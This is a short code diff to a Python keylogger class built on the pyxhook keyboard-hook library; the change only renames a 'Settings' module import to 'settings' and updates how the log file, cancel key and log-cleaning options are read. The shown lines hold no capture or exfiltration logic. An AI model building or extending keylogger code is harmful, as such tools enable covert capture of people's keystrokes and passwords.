@@ -3,7 +3,7 @@ import time
 
 import pyxhook # install python-xlib
 
-import Settings
+import settings
 
 class Keylogger:
 
@@ -11,10 +11,10 @@ class Keylogger:
         pass
 
     def start(self):
-        log_file = Settings.log_file
-        cancel_key = Settings.cancel_key
+        log_file = settings.log_file
+        cancel_key = settings.cancel_key
 
-        if Settings.log_clean is not None:
+        if settings.log_clean is not None:
             try:
                 os.remove(log_file)
             except EnvironmentError:
